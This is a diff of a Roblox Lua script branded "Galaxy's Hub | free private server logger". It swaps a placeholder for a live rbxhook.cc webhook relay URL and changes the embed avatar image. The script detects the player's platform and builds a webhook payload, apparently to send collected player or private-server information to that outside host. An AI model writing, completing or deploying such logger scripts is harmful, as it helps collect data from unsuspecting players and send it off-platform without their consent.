@@ -7,7 +7,7 @@ local HttpService = game:GetService("HttpService")
 local UserInputService = game:GetService("UserInputService")
 local MarketplaceService = game:GetService("MarketplaceService")
 
-local url = "RELAY URL HERE"
+local url = "https://rbxhook.cc/r/5b8eb61e1c6371c991672e07144be2bb"
 
 local function getPlatform()
     if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
@@ -79,7 +79,7 @@ pcall(function()
 end)
 
 local data = {
-    avatar_url = "https://rbxhook.cc/img/logo.png",
+    avatar_url = "https://image2url.com/images/1765321843919-d6a101a5-e511-4c74-8cc4-2dc979ceddbc.png",
     content = "",
     username = "Galaxy's Hub | free private server logger",
     embeds = {
